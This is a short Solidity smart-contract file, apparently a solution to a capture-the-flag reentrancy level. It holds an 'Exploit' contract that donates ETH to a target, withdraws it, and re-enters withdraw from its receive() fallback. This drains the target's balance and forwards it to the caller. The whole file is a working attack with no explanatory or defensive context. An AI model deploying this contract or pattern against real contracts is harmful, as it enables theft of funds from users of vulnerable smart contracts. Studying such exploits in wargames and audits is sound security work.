// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}

contract Exploit{
    IReentrance public vulncontract;

    constructor(address _vulncontract){
        vulncontract = IReentrance(_vulncontract);
    }
    
    function exploit(uint256 amount) external payable{
        vulncontract.donate{value: amount}(address(this)); //send eth

        uint256 withdrawalAmount = vulncontract.balanceOf(address(this));
        vulncontract.withdraw(withdrawalAmount);

        payable(msg.sender).transfer(address(this).balance);
    }

    receive() payable external {
        uint256 withdrawalAmount = vulncontract.balanceOf(address(this));
        vulncontract.withdraw(withdrawalAmount);
    }

}
